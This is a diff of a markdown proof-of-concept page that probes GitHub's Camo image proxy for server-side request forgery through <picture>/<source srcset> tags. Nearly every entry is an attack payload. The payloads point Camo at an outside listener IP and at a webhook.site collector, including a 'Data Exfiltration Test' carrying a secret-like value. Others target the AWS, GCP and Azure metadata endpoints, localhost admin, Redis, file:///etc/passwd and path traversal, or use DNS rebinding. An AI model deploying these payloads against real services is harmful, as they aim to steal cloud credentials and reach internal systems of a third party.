@@ -2,179 +2,123 @@
 
 Testing GitHub Camo proxy SSRF vulnerability via `<picture>` and `<source srcset>` elements.
 
----
-
-## Basic SSRF Confirmation
-<picture>
-  <source srcset="https://oob.example.com/ssrf-test-1">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Test 1">
-</picture>
+**Webhook Listener:** `https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af`
 
 ---
 
-## Timing Attack Test
+## Test 1: Basic SSRF Confirmation
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-2-timing?delay=10">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Timing Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=1-basic-ssrf">
+  <img src="https://via.placeholder.com/1x1" alt="Test 1">
 </picture>
 
 ---
 
-## Data Exfiltration Test
+## Test 2: With Custom Headers Check
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-3-data?data=github-internal-secret">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Data Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=2-headers&origin=github-camo">
+  <img src="https://via.placeholder.com/1x1" alt="Test 2">
 </picture>
 
 ---
 
-## Header Analysis Test
+## Test 3: Data in URL Path
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-4-headers">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Header Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af/ssrf-poc-path-test">
+  <img src="https://via.placeholder.com/1x1" alt="Test 3">
 </picture>
 
 ---
 
-## Redirect Following Test
+## Test 4: Multiple Query Params
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-5-redirect?step=1">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redirect Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=4&repo=jessi2000/testrepo&vuln=camo-ssrf&time=1736675000">
+  <img src="https://via.placeholder.com/1x1" alt="Test 4">
 </picture>
 
 ---
 
-## Large Response Test (50MB)
+## Test 5: URL Encoded Data
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-6-large?size=50">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Large Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=5&data=%7B%22secret%22%3A%22test123%22%7D">
+  <img src="https://via.placeholder.com/1x1" alt="Test 5">
 </picture>
 
 ---
 
-## Slow Response Test (30s)
+## Test 6: AWS Metadata Simulation
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-7-slow?duration=30">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Slow Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=6-aws-meta&simulated_path=/latest/meta-data/iam/security-credentials/">
+  <img src="https://via.placeholder.com/1x1" alt="Test 6">
 </picture>
 
 ---
 
-## Protocol Confusion Tests
+## Test 7: Internal IP Reference
 <picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ftp">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="FTP Test">
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf-test-8-protocols?protocol=ldap">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="LDAP Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=7&internal_target=192.168.1.1">
+  <img src="https://via.placeholder.com/1x1" alt="Test 7">
 </picture>
 
 ---
 
-## Internal Service Simulation
+## Test 8: Timestamp Tracking
 <picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=aws-metadata">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS Test">
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=redis-info">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis Test">
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/simulate-internal?service=mysql-status">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="MySQL Test">
+  <source srcset="https://webhook.site/faf9e600-45b8-4000-a537-1013dcdf16af?test=8-timestamp&viewed_at=2026-01-12T10:00:00Z">
+  <img src="https://via.placeholder.com/1x1" alt="Test 8">
 </picture>
 
 ---
 
-## AWS Metadata SSRF Tests
+## ⚠️ Cloud Metadata SSRF Tests (Original URLs)
 
-### IMDSv1 Test
+### AWS IMDSv1
 <picture>
   <source srcset="http://169.254.169.254/latest/meta-data/">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="AWS IMDSv1">
+  <img src="https://via.placeholder.com/1x1" alt="AWS IMDSv1">
 </picture>
 
-### GCP Metadata Test
+### GCP Metadata
 <picture>
   <source srcset="http://metadata.google.internal/computeMetadata/v1/">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="GCP Metadata">
+  <img src="https://via.placeholder.com/1x1" alt="GCP Metadata">
 </picture>
 
-### Azure Metadata Test
+### Azure IMDS
 <picture>
   <source srcset="http://169.254.169.254/metadata/instance?api-version=2021-02-01">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Azure Metadata">
+  <img src="https://via.placeholder.com/1x1" alt="Azure Metadata">
 </picture>
 
 ---
 
-## localhost/internal Tests
+## 🔒 localhost/Internal Tests
+
+### localhost:8080
 <picture>
   <source srcset="http://localhost:8080/admin">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="localhost">
+  <img src="https://via.placeholder.com/1x1" alt="localhost">
 </picture>
 
+### 127.0.0.1 Redis
 <picture>
-  <source srcset="http://127.0.0.1:6379/info">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Redis">
+  <source srcset="http://127.0.0.1:6379/">
+  <img src="https://via.placeholder.com/1x1" alt="Redis">
 </picture>
 
+### IPv6 localhost
 <picture>
   <source srcset="http://[::1]:80/">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="IPv6 localhost">
-</picture>
-
-<picture>
-  <source srcset="http://0.0.0.0:80/">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="0.0.0.0">
+  <img src="https://via.placeholder.com/1x1" alt="IPv6">
 </picture>
 
 ---
 
-## DNS Rebinding Test
-<picture>
-  <source srcset="http://rebind.network/ssrf-test">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="DNS Rebind">
-</picture>
+## 📊 Expected Results
 
----
+If vulnerable, webhook.site will receive requests from GitHub's Camo proxy (IP: camo.githubusercontent.com) with:
+- User-Agent indicating Camo
+- Original URL preserved
+- Request headers from GitHub's infrastructure
 
-## URL Encoding Bypass
-<picture>
-  <source srcset="http://164.90.187.218:8080/%2e%2e/%2e%2e/etc/passwd">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Path Traversal">
-</picture>
-
-<picture>
-  <source srcset="http://164.90.187.218:8080/ssrf?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="URL Encoded">
-</picture>
-
----
-
-## Multiple srcset URLs
-<picture>
-  <source srcset="http://164.90.187.218:8080/test1 1x, http://164.90.187.218:8080/test2 2x">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Multi srcset">
-</picture>
-
----
-
-## File Protocol Test
-<picture>
-  <source srcset="file:///etc/passwd">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="File Protocol">
-</picture>
-
----
-
-## Webhook.site Test (Replace with your ID)
-<picture>
-  <source srcset="https://webhook.site/YOUR-UNIQUE-ID-HERE?test=github-ssrf">
-  <img src="https://github.com/zebbern/github-secrets/blob/main/2.jpg" alt="Webhook Test">
-</picture>
+**Check results at:** https://webhook.site/#!/view/faf9e600-45b8-4000-a537-1013dcdf16af
